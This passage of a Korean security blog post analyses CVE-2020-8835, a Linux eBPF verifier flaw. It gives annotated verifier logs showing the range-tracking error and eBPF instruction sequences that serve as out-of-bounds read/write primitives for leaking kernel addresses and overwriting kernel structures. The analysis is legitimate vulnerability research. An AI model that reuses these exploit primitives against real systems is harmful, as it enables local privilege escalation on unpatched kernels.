<span class="c1">// memory 내 값을 변조</span>
<span class="c1">// update_elem(0, 2); &lt;= 읽을 메모리</span>
<span class="c1">// update_elem(1, 0);</span>

<span class="c1">// memory 읽기</span>
<span class="k">from</span> <span class="mi">7</span> <span class="nx">to</span> <span class="mi">9</span><span class="p">:</span> <span class="nx">R0</span><span class="o">=</span><span class="nx">map_value</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">9</span><span class="p">:</span> <span class="p">(</span><span class="mi">79</span><span class="p">)</span> <span class="nx">r6</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="nx">u64</span> <span class="o">*</span><span class="p">)(</span><span class="nx">r0</span> <span class="o">+</span><span class="mi">0</span><span class="p">)</span>
 <span class="nx">R0</span><span class="o">=</span><span class="nx">map_value</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">10</span><span class="p">:</span> <span class="p">(</span><span class="nx">b7</span><span class="p">)</span> <span class="nx">r0</span> <span class="o">=</span> <span class="mi">0</span>
<span class="c1">// 읽은 값 비교 (min)</span>
<span class="mi">11</span><span class="p">:</span> <span class="p">(</span><span class="mi">35</span><span class="p">)</span> <span class="k">if</span> <span class="nx">r6</span> <span class="o">&gt;=</span> <span class="mh">0x1</span> <span class="nx">goto</span> <span class="nx">pc</span><span class="o">+</span><span class="mi">1</span>
 <span class="nx">R0_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R6_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">12</span><span class="p">:</span> <span class="p">(</span><span class="mi">95</span><span class="p">)</span> <span class="nx">exit</span>

<span class="c1">// 읽은 값 비교 (max) </span>
<span class="k">from</span> <span class="mi">11</span> <span class="nx">to</span> <span class="mi">13</span><span class="p">:</span> <span class="nx">R0_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R6_w</span><span class="o">=</span><span class="nx">inv</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">umin_value</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">13</span><span class="p">:</span> <span class="p">(</span><span class="mi">18</span><span class="p">)</span> <span class="nx">r7</span> <span class="o">=</span> <span class="mh">0x100000001</span>
<span class="mi">15</span><span class="p">:</span> <span class="p">(</span><span class="nx">bd</span><span class="p">)</span> <span class="k">if</span> <span class="nx">r6</span> <span class="o">&lt;=</span> <span class="nx">r7</span> <span class="nx">goto</span> <span class="nx">pc</span><span class="o">+</span><span class="mi">1</span>
 <span class="nx">R0_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R6_w</span><span class="o">=</span><span class="nx">inv</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">umin_value</span><span class="o">=</span><span class="mi">4294967298</span><span class="p">)</span> <span class="nx">R7_w</span><span class="o">=</span><span class="nx">inv4294967297</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">16</span><span class="p">:</span> <span class="p">(</span><span class="mi">95</span><span class="p">)</span> <span class="nx">exit</span>

<span class="c1">// jmp32 oob (r6 range = [1, 1])</span>
<span class="k">from</span> <span class="mi">15</span> <span class="nx">to</span> <span class="mi">17</span><span class="p">:</span> <span class="nx">R0_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R6_w</span><span class="o">=</span><span class="nx">inv</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">umin_value</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="nx">umax_value</span><span class="o">=</span><span class="mi">4294967297</span><span class="p">,</span><span class="nx">var_off</span><span class="o">=</span><span class="p">(</span><span class="mh">0x0</span><span class="p">;</span> <span class="mh">0x1ffffffff</span><span class="p">))</span> <span class="nx">R7_w</span><span class="o">=</span><span class="nx">inv4294967297</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">17</span><span class="p">:</span> <span class="p">(</span><span class="mi">56</span><span class="p">)</span> <span class="k">if</span> <span class="nx">w6</span> <span class="o">!=</span> <span class="mh">0x5</span> <span class="nx">goto</span> <span class="nx">pc</span><span class="o">+</span><span class="mi">1</span>
 <span class="nx">R0_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R6_w</span><span class="o">=</span><span class="nx">inv</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">umin_value</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span><span class="nx">umax_value</span><span class="o">=</span><span class="mi">4294967297</span><span class="p">,</span><span class="nx">var_off</span><span class="o">=</span><span class="p">(</span><span class="mh">0x5</span><span class="p">;</span> <span class="mh">0x100000000</span><span class="p">))</span> <span class="nx">R7_w</span><span class="o">=</span><span class="nx">inv4294967297</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">18</span><span class="p">:</span> <span class="p">(</span><span class="mi">95</span><span class="p">)</span> <span class="nx">exit</span>

<span class="c1">// 실제 r6 = 2 연산후 r2는 (r6&amp;2) &gt;&gt; 1 == 1. 하지만 위에서 range를 [1, 1]로 인식해서 (1&amp;2) &gt;&gt; 1</span>
<span class="k">from</span> <span class="mi">17</span> <span class="nx">to</span> <span class="mi">19</span><span class="p">:</span> <span class="nx">R0</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R6</span><span class="o">=</span><span class="nx">inv</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">umin_value</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="nx">umax_value</span><span class="o">=</span><span class="mi">4294967297</span><span class="p">,</span><span class="nx">var_off</span><span class="o">=</span><span class="p">(</span><span class="mh">0x1</span><span class="p">;</span> <span class="mh">0x100000000</span><span class="p">))</span> <span class="nx">R7</span><span class="o">=</span><span class="nx">inv4294967297</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">19</span><span class="p">:</span> <span class="p">(</span><span class="mi">57</span><span class="p">)</span> <span class="nx">r6</span> <span class="o">&amp;=</span> <span class="mi">2</span>
<span class="mi">20</span><span class="p">:</span> <span class="p">(</span><span class="mi">77</span><span class="p">)</span> <span class="nx">r6</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
<span class="mi">21</span><span class="p">:</span> <span class="p">(</span><span class="nx">bf</span><span class="p">)</span> <span class="nx">r1</span> <span class="o">=</span> <span class="nx">r9</span>
<span class="mi">22</span><span class="p">:</span> <span class="p">(</span><span class="nx">bf</span><span class="p">)</span> <span class="nx">r2</span> <span class="o">=</span> <span class="nx">r10</span>
<span class="mi">23</span><span class="p">:</span> <span class="p">(</span><span class="mi">07</span><span class="p">)</span> <span class="nx">r2</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">4</span>
<span class="mi">24</span><span class="p">:</span> <span class="p">(</span><span class="mi">62</span><span class="p">)</span> <span class="o">*</span><span class="p">(</span><span class="nx">u32</span> <span class="o">*</span><span class="p">)(</span><span class="nx">r10</span> <span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
<span class="mi">25</span><span class="p">:</span> <span class="p">(</span><span class="mi">85</span><span class="p">)</span> <span class="nx">call</span> <span class="nx">bpf_map_lookup_elem</span><span class="err">#</span><span class="mi">1</span>
<span class="mi">26</span><span class="p">:</span> <span class="p">(</span><span class="mi">55</span><span class="p">)</span> <span class="k">if</span> <span class="nx">r0</span> <span class="o">!=</span> <span class="mh">0x0</span> <span class="nx">goto</span> <span class="nx">pc</span><span class="o">+</span><span class="mi">1</span>
 <span class="nx">R0_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R6_w</span><span class="o">=</span><span class="nx">inv0</span> <span class="nx">R7</span><span class="o">=</span><span class="nx">inv4294967297</span> <span class="nx">R9</span><span class="o">=</span><span class="nx">map_ptr</span><span class="p">(</span><span class="nx">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="nx">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="nx">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="nx">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="nx">R10</span><span class="o">=</span><span class="nx">fp0</span> <span class="nx">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="nx">mmmm</span><span class="p">????</span>
<span class="mi">27</span><span class="p">:</span> <span class="p">(</span><span class="mi">95</span><span class="p">)</span> <span class="nx">exit</span>
</code></pre></div></div>

<p>실제 r6가 변조되어 oob트리거</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">31</span><span class="o">:</span> <span class="p">(</span><span class="mi">27</span><span class="p">)</span> <span class="n">r6</span> <span class="o">*=</span> <span class="mi">272</span> <span class="c1">// 현재 r6 = 1</span>
<span class="mi">32</span><span class="o">:</span> <span class="p">(</span><span class="n">bf</span><span class="p">)</span> <span class="n">r1</span> <span class="o">=</span> <span class="n">r9</span>
<span class="mi">33</span><span class="o">:</span> <span class="p">(</span><span class="n">bf</span><span class="p">)</span> <span class="n">r2</span> <span class="o">=</span> <span class="n">r10</span>
<span class="mi">34</span><span class="o">:</span> <span class="p">(</span><span class="mo">07</span><span class="p">)</span> <span class="n">r2</span> <span class="o">+=</span> <span class="o">-</span><span class="mi">4</span>
<span class="mi">35</span><span class="o">:</span> <span class="p">(</span><span class="mi">62</span><span class="p">)</span> <span class="o">*</span><span class="p">(</span><span class="n">u32</span> <span class="o">*</span><span class="p">)(</span><span class="n">r10</span> <span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
<span class="mi">36</span><span class="o">:</span> <span class="p">(</span><span class="mi">85</span><span class="p">)</span> <span class="n">call</span> <span class="n">bpf_map_lookup_elem</span><span class="err">#</span><span class="mi">1</span>
<span class="mi">37</span><span class="o">:</span> <span class="p">(</span><span class="mi">55</span><span class="p">)</span> <span class="k">if</span> <span class="n">r0</span> <span class="o">!=</span> <span class="mh">0x0</span> <span class="k">goto</span> <span class="n">pc</span><span class="o">+</span><span class="mi">1</span>  <span class="c1">// R6=inv0 JIT컴파일 결과 R6는 scalar 0 으로 인식. oob 체크 우회. 실제로는 1</span>
 <span class="n">R0</span><span class="o">=</span><span class="n">inv0</span> <span class="n">R6</span><span class="o">=</span><span class="n">inv0</span> <span class="n">R7</span><span class="o">=</span><span class="n">inv0</span> <span class="n">R9</span><span class="o">=</span><span class="n">map_ptr</span><span class="p">(</span><span class="n">id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">off</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">ks</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span><span class="n">vs</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="n">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="n">R10</span><span class="o">=</span><span class="n">fp0</span> <span class="n">fp</span><span class="o">-</span><span class="mi">8</span><span class="o">=</span><span class="n">mmmm</span><span class="o">????</span>
</code></pre></div></div>

<p>계속 나오는 <code class="highlighter-rouge">call bpf_map_lookup_elem</code>은 메모리 건드는것. 코딩 컨벤션 어셈과 똑같다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">bpf_map_lookup_elem</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">.</span> <span class="p">...);</span>
<span class="kt">void</span> <span class="nf">bpf_map_update_elem</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="p">...,</span> <span class="n">__u64</span> <span class="n">flags</span><span class="p">);</span>
<span class="kt">void</span> <span class="nf">bpf_map_delete_elem</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">);</span>
</code></pre></div></div>

<p>이후 할당된 map주변에서 oob로 적당히 커널 주소 읽고 커널 익스. write도 map에 쓰듯이 똑같이 트리거 할 수 있다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">23</span><span class="p">),</span> <span class="c1">// op=0 -&gt; read aslr</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_MUL</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">,</span> <span class="mh">0x110</span><span class="p">),</span>
<span class="n">BPF_MAP_GET_ADDR</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">),</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">),</span>
<span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_MAP_GET_ADDR</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">),</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">22</span><span class="p">),</span> <span class="c1">// op=1 -&gt; write btf</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_MUL</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">),</span>
<span class="n">BPF_MAP_GET_ADDR</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">),</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">),</span>
<span class="n">BPF_MAP_GET</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">),</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>

<span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">23</span><span class="p">),</span> <span class="c1">// op=2 -&gt; read attr</span>
<span class="n">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_MUL</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">),</span>
<span class="n">BPF_MAP_GET_ADDR</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">),</span>
<span class="n">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_SUB</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">),</span>
<span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_MAP_GET_ADDR</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">),</span>
<span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_6</span><span class="p">,</span> <span class="n">BPF_REG_8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
<span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
</code></pre></div></div>

<h2 id="reference">reference</h2>

<p><a href="https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</a></p>

<p><a href="https://wariua.github.io/facility/extended-bpf.html">https://wariua.github.io/facility/extended-bpf.html</a></p>

<p><a href="https://www.kernel.org/doc/Documentation/networking/filter.txt">https://www.kernel.org/doc/Documentation/networking/filter.txt</a></p>

<p><a href="http://www.tcpdump.org/papers/bpf-usenix93.pdf">http://www.tcpdump.org/papers/bpf-usenix93.pdf</a></p>

<p><a href="https://www.netronome.com/m/documents/demystify-ebpf-jit-compiler.pdf">https://www.netronome.com/m/documents/demystify-ebpf-jit-compiler.pdf</a></p>

<p><a href="https://github.com/DayJun/Blogs/blob/master/Articles/CVES/CVE-2020-8835/">https://github.com/DayJun/Blogs/blob/master/Articles/CVES/CVE-2020-8835/</a></p>

   </div>
</div>


  <!-- Start disqus 
<script src="/assets/js/disqusLoader.js" /></script>
<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
<div class="disqus"></div>
<script>
    disqusLoader('.disqus', {
        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
    });
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
End disqus -->


<div class="pagination">
  
   <a href="/2020-05-01/DNS-Tunneling" class="left arrow">&#8592;</a>
  
  
   <a href="/2020-04-01/hw-interrupt" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <!--footer>
  <span>
    &copy; <time datetime="2020-09-02 13:31:22 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
  </span>
</footer-->

  </body>
</html>
